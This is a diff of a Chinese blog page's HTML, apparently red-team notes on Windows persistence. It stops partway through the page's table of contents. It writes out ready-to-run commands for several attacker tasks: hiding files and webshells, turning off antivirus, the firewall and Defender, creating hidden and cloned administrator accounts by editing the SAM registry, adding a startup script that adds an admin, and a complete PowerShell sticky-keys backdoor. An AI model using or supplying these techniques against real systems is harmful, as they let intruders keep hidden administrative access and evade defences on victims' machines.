@@ -298,65 +298,83 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3><h4 id="隐藏技巧"><a href="#隐藏技巧" class="headerlink" title="隐藏技巧"></a>隐藏技巧</h4><h5 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h5><p><code>attrib +s +a +h +r c:\test</code></p>
+        <h3 id="windows权限维持">Windows权限维持</h3>
+<h4 id="隐藏技巧">隐藏技巧</h4>
+<h5 id="文件隐藏">文件隐藏</h5>
+<p><code>attrib +s +a +h +r c:\test</code></p>
 <p>把原本的⽂件夹增加了系统⽂件属性、存档⽂件属性、只读⽂件属性和隐藏⽂件属性。</p>
-<h5 id="系统文件夹图标"><a href="#系统文件夹图标" class="headerlink" title="系统文件夹图标"></a>系统文件夹图标</h5><h6 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h6><ul>
+<h5 id="系统文件夹图标">系统文件夹图标</h5>
+<h6 id="步骤">步骤</h6>
+<ul>
 <li>1.新建文件夹 并将文件存入</li>
-<li>2.修改命名为 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D} 然后访问该文件夹，打开会打开我的电脑</li>
+<li>2.修改命名为 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
+然后访问该文件夹，打开会打开我的电脑</li>
 <li>3.如果需要查看内容 可以使用winrar 等去查看或 恢复</li>
 </ul>
-<h6 id="代号"><a href="#代号" class="headerlink" title="代号"></a>代号</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建目录</span><br><span class="line">md a...\      //三个点,实际显示为 a..</span><br><span class="line">#复制文件</span><br><span class="line">copy test a...\test</span><br><span class="line">#删除目录</span><br><span class="line">rd /s /q a...\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h5 id="利用系统保留文件名创建无法删除的webshell"><a href="#利用系统保留文件名创建无法删除的webshell" class="headerlink" title="利用系统保留文件名创建无法删除的webshell"></a>利用系统保留文件名创建无法删除的webshell</h5><p>（注: 火绒就可以粉碎…）</p>
-<p>Windows 下不能够以下面这些字样来命名文件/文件夹，包括：aux，com1，com2，prn，con和nul等，但是通过cmd下是可以创建此类文件夹的，使用copy命令即可实现</p>
+<h6 id="代号">代号</h6>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="畸形目录">畸形目录</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建目录</span><br><span class="line">md a...\      //三个点,实际显示为 a..</span><br><span class="line">#复制文件</span><br><span class="line">copy test a...\test</span><br><span class="line">#删除目录</span><br><span class="line">rd /s /q a...\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>##### 利用系统保留文件名创建无法删除的webshell</p>
+<p>（注: 火绒就可以粉碎...）</p>
+<p>Windows
+下不能够以下面这些字样来命名文件/文件夹，包括：aux，com1，com2，prn，con和nul等，但是通过cmd下是可以创建此类文件夹的，使用copy命令即可实现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 方法</span><br><span class="line">copy 1.jsp   \\.\E:\test\aux.jsp</span><br><span class="line">del \\.\E:\test\aux.jsp</span><br><span class="line">type \\.\E:\test\aux.jsp</span><br><span class="line"></span><br><span class="line">#可以使用attrib隐藏文件 </span><br><span class="line">#这种在设置显示隐藏文件后/dir  也无法看到</span><br><span class="line">attrib 1.txt //查看⽂件属性 </span><br><span class="line">attrib 1.txt -r -s //删除⽂件属性</span><br><span class="line">attrib +H +S 1.asp 改变⽂件属性，隐藏1.asp</span><br><span class="line">attrib -H -S 1.asp </span><br></pre></td></tr></table></figure>
-
-<h5 id="驱动级文件隐藏"><a href="#驱动级文件隐藏" class="headerlink" title="驱动级文件隐藏"></a>驱动级文件隐藏</h5><p>可以利用 <code>Easy File Locker </code> 对文件夹进行隐藏</p>
-<p> 下载链接： <a target="_blank" rel="noopener" href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p>
-<br>
-
-<br>
-
-<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//meterperter中使用</span><br><span class="line">run killav </span><br><span class="line">//关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">//关闭windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>
-
+<h5 id="驱动级文件隐藏">驱动级文件隐藏</h5>
+<p>可以利用 <code>Easy File Locker</code> 对文件夹进行隐藏</p>
+<p>下载链接： http://www.xoslab.com/efl.html</p>
+<p><br></p>
+<p><br></p>
+<h4 id="关闭杀软">关闭杀软</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//meterperter中使用</span><br><span class="line">run killav </span><br><span class="line">//关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">//关闭windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>
 <p>还有几个大佬github上关杀软的项目</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Yihsiwei/GetOut360">https://github.com/Yihsiwei/GetOut360</a></p>
-<br>
-
-<h4 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h4><h5 id="1-创建隐藏账户"><a href="#1-创建隐藏账户" class="headerlink" title="1.创建隐藏账户"></a>1.创建隐藏账户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#创建完成后仍可以通过计算机管理和登录处看到该用户</span><br><span class="line">net user test$ Test.123 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-打开注册表-regedit-修改权限"><a href="#2-打开注册表-regedit-修改权限" class="headerlink" title="2.打开注册表 regedit 修改权限"></a>2.打开注册表 regedit 修改权限</h5><p><code>HKEY_LOCAL_MACHINE\SAM\SAM</code> 的adminstrator权限修改为完全控制和读取，然后重新打开注册表便可继续查看内容</p>
-<h5 id="3-导出test-账户的reg-和-对应类型（0xXX的那个文件）和administrator对应十六进制的注册表"><a href="#3-导出test-账户的reg-和-对应类型（0xXX的那个文件）和administrator对应十六进制的注册表" class="headerlink" title="3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表"></a>3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表</h5><p>路径为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></p>
-<h5 id="4-将test-对应的00000XXX-reg的-F值替换为administrator-对应00000XXX-reg的F值"><a href="#4-将test-对应的00000XXX-reg的-F值替换为administrator-对应00000XXX-reg的F值" class="headerlink" title="4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值"></a>4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值</h5><h5 id="5-删除test-用户"><a href="#5-删除test-用户" class="headerlink" title="5.删除test$用户"></a>5.删除test$用户</h5><p><code>net user test$ /del</code>  （删除后注册表里的test$用户就无法打开了）</p>
-<h5 id="6-在cmd导入test-的两个注册表"><a href="#6-在cmd导入test-的两个注册表" class="headerlink" title="6.在cmd导入test$的两个注册表"></a>6.在cmd导入test$的两个注册表</h5><p>(这样就不会在计算机管理和登录页面看到创建的账户了，但仍可以在组成不SAM下看到,登录后会在计算机管理中显示该用户，想要清除该用户需要在注册表清除)</p>
+<p>https://github.com/Yaxser/Backstab</p>
+<p>https://github.com/Yihsiwei/GetOut360</p>
+<p><br></p>
+<h4 id="影子用户">影子用户</h4>
+<h5 id="创建隐藏账户">1.创建隐藏账户</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#创建完成后仍可以通过计算机管理和登录处看到该用户</span><br><span class="line">net user test$ Test.123 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>
+<h5 id="打开注册表-regedit-修改权限">2.打开注册表 regedit 修改权限</h5>
+<p><code>HKEY_LOCAL_MACHINE\SAM\SAM</code>
+的adminstrator权限修改为完全控制和读取，然后重新打开注册表便可继续查看内容</p>
+<h5 id="导出test账户的reg-和-对应类型0xxx的那个文件和administrator对应十六进制的注册表">3.导出test$账户的reg
+和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表</h5>
+<p>路径为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></p>
+<h5 id="将test对应的00000xxx.reg的-f值替换为administrator-对应00000xxx.reg的f值">4.将test$对应的00000XXX.reg的
+F值替换为administrator 对应00000XXX.reg的F值</h5>
+<h5 id="删除test用户">5.删除test$用户</h5>
+<p><code>net user test$ /del</code>
+（删除后注册表里的test$用户就无法打开了）</p>
+<h5 id="在cmd导入test的两个注册表">6.在cmd导入test$的两个注册表</h5>
+<p>(这样就不会在计算机管理和登录页面看到创建的账户了，但仍可以在组成不SAM下看到,登录后会在计算机管理中显示该用户，想要清除该用户需要在注册表清除)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit  /s 1.reg</span><br><span class="line">regedit  /s 2.reg</span><br></pre></td></tr></table></figure>
-
-<h5 id="7-使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆"><a href="#7-使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆" class="headerlink" title="7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆"></a>7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆</h5><br>
-
-<h4 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h4><p>win+R    gpedit.msc 打开本地组策略编辑器<br>选择计算机管理-&gt;WIndows设置-&gt;脚本(启动/关闭)  选择启动或关闭 添加bat脚本</p>
+<h5 id="使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆">7.使用3389登录
+会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆</h5>
+<p><br></p>
+<h4 id="组策略">组策略</h4>
+<p>win+R gpedit.msc 打开本地组策略编辑器
+选择计算机管理-&gt;WIndows设置-&gt;脚本(启动/关闭) 选择启动或关闭
+添加bat脚本</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">net user test<span class="variable">$</span> Test.<span class="number">123</span> /add</span><br><span class="line">net localgroup administrators test<span class="variable">$</span> /add</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><h5 id="Shiftkey"><a href="#Shiftkey" class="headerlink" title="Shiftkey"></a>Shiftkey</h5><p><code>Set-ExecutionPolicy Unrestricted</code></p>
+<p><br></p>
+<h4 id="粘滞键后门">粘滞键后门</h4>
+<h5 id="shiftkey">Shiftkey</h5>
+<p><code>Set-ExecutionPolicy Unrestricted</code></p>
 <p><code>Import-Module .\shiftkey.ps1</code></p>
-<p>运行一次会启动 再次运行会删除<br>在用户登录下为当前用户权限，在登录界面为system权限</p>
+<p>运行一次会启动 再次运行会删除
+在用户登录下为当前用户权限，在登录界面为system权限</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$registryPath</span> = <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&quot;</span> </span><br><span class="line"><span class="variable">$keyName</span> = <span class="string">&quot;sethc.exe&quot;</span> </span><br><span class="line"><span class="variable">$stringName</span> = <span class="string">&quot;Debugger&quot;</span> </span><br><span class="line"><span class="variable">$binaryValue</span> = <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"><span class="keyword">IF</span> (<span class="built_in">Test-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>)) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment"># Sticky Keys backdoor exists.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key found. Let&#x27;s remove it.&quot;</span>    </span><br><span class="line">     <span class="comment">#New-Item -Path $registryPath -Name $keyName | Out-Null    </span></span><br><span class="line">     <span class="built_in">Remove-Item</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Key backdoor has been removed.&quot;</span>    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ELSE</span> </span><br><span class="line">&#123;    </span><br><span class="line">     <span class="comment"># Sticky Keys backdoor does not exist, let&#x27;s add it.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key not found. Attempting to add Sticky Keys backdoor to registry.&quot;</span>    </span><br><span class="line">     <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$registryPath</span> <span class="literal">-Name</span> <span class="variable">$keyName</span> | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) <span class="literal">-Name</span> <span class="variable">$stringName</span> <span class="literal">-Value</span> <span class="variable">$binaryValue</span> | <span class="built_in">Out-Null</span>     </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Keys backdoor added.&quot;</span>     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h4 id="劫持后门">劫持后门</h4>
+<p><br></p>
+<h4 id="注册表">注册表</h4>
+<p><br></p>
+<h4 id="计划任务">计划任务</h4>
+<p><br></p>
+<h4 id="新服务">新服务</h4>
+<p><br></p>
+<h4 id="内存马">内存马</h4>
 
-<br>
-
-<h4 id="劫持后门"><a href="#劫持后门" class="headerlink" title="劫持后门"></a>劫持后门</h4><br>
-
-<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><br>
-
-<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><br>
-
-<h4 id="新服务"><a href="#新服务" class="headerlink" title="新服务"></a>新服务</h4><br>
-
-<h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4>
     </div>
 
     
@@ -485,7 +503,10 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">Windows权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">1.1.</span> <span class="nav-text">隐藏技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">文件隐藏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87"><span class="nav-number">1.1.2.</span> <span class="nav-text">系统文件夹图标</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E5%8F%B7"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">代号</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%95%B8%E5%BD%A2%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.3.</span> <span class="nav-text">畸形目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E4%BF%9D%E7%95%99%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%9B%E5%BB%BA%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E7%9A%84webshell"><span class="nav-number">1.1.4.</span> <span class="nav-text">利用系统保留文件名创建无法删除的webshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A9%B1%E5%8A%A8%E7%BA%A7%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-number">1.1.5.</span> <span class="nav-text">驱动级文件隐藏</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%9D%80%E8%BD%AF"><span class="nav-number">1.2.</span> <span class="nav-text">关闭杀软</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="nav-number">1.3.</span> <span class="nav-text">影子用户</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.创建隐藏账户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%89%93%E5%BC%80%E6%B3%A8%E5%86%8C%E8%A1%A8-regedit-%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.打开注册表 regedit 修改权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%AF%BC%E5%87%BAtest-%E8%B4%A6%E6%88%B7%E7%9A%84reg-%E5%92%8C-%E5%AF%B9%E5%BA%94%E7%B1%BB%E5%9E%8B%EF%BC%880xXX%E7%9A%84%E9%82%A3%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%89%E5%92%8Cadministrator%E5%AF%B9%E5%BA%94%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E5%B0%86test-%E5%AF%B9%E5%BA%94%E7%9A%8400000XXX-reg%E7%9A%84-F%E5%80%BC%E6%9B%BF%E6%8D%A2%E4%B8%BAadministrator-%E5%AF%B9%E5%BA%9400000XXX-reg%E7%9A%84F%E5%80%BC"><span class="nav-number">1.3.4.</span> <span class="nav-text">4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E5%88%A0%E9%99%A4test-%E7%94%A8%E6%88%B7"><span class="nav-number">1.3.5.</span> <span class="nav-text">5.删除test$用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E5%9C%A8cmd%E5%AF%BC%E5%85%A5test-%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.3.6.</span> <span class="nav-text">6.在cmd导入test$的两个注册表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-%E4%BD%BF%E7%94%A83389%E7%99%BB%E5%BD%95-%E4%BC%9A-%E7%99%BB%E9%99%86%E5%88%B0administrator-%E7%9A%84%E5%BD%93%E5%89%8D%E7%8A%B6%E6%80%81%E4%B8%8B-%E5%AE%9E%E7%8E%B0adminstrator%E8%B4%A6%E6%88%B7%E7%9A%84%E5%85%8B%E9%9A%86"><span class="nav-number">1.3.7.</span> <span class="nav-text">7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="nav-number">1.4.</span> <span class="nav-text">组策略</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="nav-number">1.5.</span> <span class="nav-text">粘滞键后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Shiftkey"><span class="nav-number">1.5.1.</span> <span class="nav-text">Shiftkey</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8"><span class="nav-number">1.6.</span> <span class="nav-text">劫持后门</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.7.</span> <span class="nav-text">注册表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.8.</span> <span class="nav-text">计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B0%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.9.</span> <span class="nav-text">新服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.10.</span> <span class="nav-text">内存马</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">Windows权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">1.1.</span> <span class="nav-text">隐藏技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">文件隐藏</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9B%BE%E6%A0%87"><span class="nav-number">1.1.2.</span> <span class="nav-text">系统文件夹图标</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E5%8F%B7"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">代号</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%95%B8%E5%BD%A2%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.3.</span> <span class="nav-text">畸形目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A9%B1%E5%8A%A8%E7%BA%A7%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-number">1.1.4.</span> <span class="nav-text">驱动级文件隐藏</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%9D%80%E8%BD%AF"><span class="nav-number">1.2.</span> <span class="nav-text">关闭杀软</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7"><span class="nav-number">1.3.</span> <span class="nav-text">影子用户</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.创建隐藏账户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%93%E5%BC%80%E6%B3%A8%E5%86%8C%E8%A1%A8-regedit-%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.打开注册表 regedit 修改权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%BC%E5%87%BAtest%E8%B4%A6%E6%88%B7%E7%9A%84reg-%E5%92%8C-%E5%AF%B9%E5%BA%94%E7%B1%BB%E5%9E%8B0xxx%E7%9A%84%E9%82%A3%E4%B8%AA%E6%96%87%E4%BB%B6%E5%92%8Cadministrator%E5%AF%B9%E5%BA%94%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%9A%84%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.导出test$账户的reg
+和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%86test%E5%AF%B9%E5%BA%94%E7%9A%8400000xxx.reg%E7%9A%84-f%E5%80%BC%E6%9B%BF%E6%8D%A2%E4%B8%BAadministrator-%E5%AF%B9%E5%BA%9400000xxx.reg%E7%9A%84f%E5%80%BC"><span class="nav-number">1.3.4.</span> <span class="nav-text">4.将test$对应的00000XXX.reg的
